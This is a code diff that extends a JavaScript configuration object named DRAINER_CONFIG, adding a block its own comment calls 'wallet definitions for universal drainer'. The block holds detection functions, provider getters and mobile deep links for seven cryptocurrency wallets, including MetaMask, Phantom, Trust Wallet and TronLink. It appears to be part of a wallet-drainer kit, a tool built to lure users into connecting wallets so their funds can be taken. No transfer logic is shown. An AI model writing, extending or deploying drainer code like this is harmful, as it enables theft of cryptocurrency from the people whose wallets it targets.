@@ -268,6 +268,76 @@ window.DRAINER_CONFIG = {
         walletConnectSupport: true,
         batchTransactions: true,
         gasOptimization: true
+    },
+
+    // Wallet definitions for universal drainer
+    wallets: {
+        metamask: {
+            name: "MetaMask",
+            icon: "🦊",
+            type: "evm",
+            networks: ["ethereum", "bsc", "polygon"],
+            detect: () => window.ethereum && window.ethereum.isMetaMask,
+            getProvider: () => window.ethereum,
+            mobileDeepLink: "https://metamask.app.link/dapp/"
+        },
+        trust: {
+            name: "Trust Wallet",
+            icon: "🛡️",
+            type: "multi-evm-tron",
+            networks: ["ethereum", "bsc", "polygon", "tron"],
+            detect: () => window.ethereum && window.ethereum.isTrust,
+            getProvider: () => window.ethereum,
+            mobileDeepLink: "https://link.trustwallet.com/open_url?coin_id=60&url="
+        },
+        phantom: {
+            name: "Phantom",
+            icon: "👻",
+            type: "multi-evm-solana",
+            networks: ["ethereum", "solana"],
+            evmNetworks: ["ethereum"],
+            solanaNetworks: ["solana"],
+            detect: () => window.phantom || (window.ethereum && window.ethereum.isPhantom),
+            getProvider: () => window.ethereum || window.phantom?.ethereum,
+            getSolanaProvider: () => window.phantom?.solana,
+            mobileDeepLink: "https://phantom.app/ul/browse/"
+        },
+        coinbase: {
+            name: "Coinbase Wallet",
+            icon: "🔵",
+            type: "evm",
+            networks: ["ethereum", "bsc", "polygon"],
+            detect: () => window.ethereum && window.ethereum.isCoinbaseWallet,
+            getProvider: () => window.ethereum,
+            mobileDeepLink: "https://go.cb-w.com/dapp?cb_url="
+        },
+        tronlink: {
+            name: "TronLink",
+            icon: "🔴",
+            type: "tron",
+            networks: ["tron"],
+            detect: () => window.tronWeb && window.tronWeb.defaultAddress,
+            getProvider: () => window.tronWeb,
+            mobileDeepLink: "https://dapp.tronlink.org/"
+        },
+        rainbow: {
+            name: "Rainbow",
+            icon: "🌈",
+            type: "evm",
+            networks: ["ethereum"],
+            detect: () => window.ethereum && window.ethereum.isRainbow,
+            getProvider: () => window.ethereum,
+            mobileDeepLink: "https://rainbow.me/dapp?url="
+        },
+        coin98: {
+            name: "Coin98",
+            icon: "💰",
+            type: "multi",
+            networks: ["ethereum", "bsc", "polygon", "solana"],
+            detect: () => window.ethereum && window.ethereum.isCoin98,
+            getProvider: () => window.ethereum,
+            mobileDeepLink: "https://coin98.com/wallet"
+        }
     }
 };
 
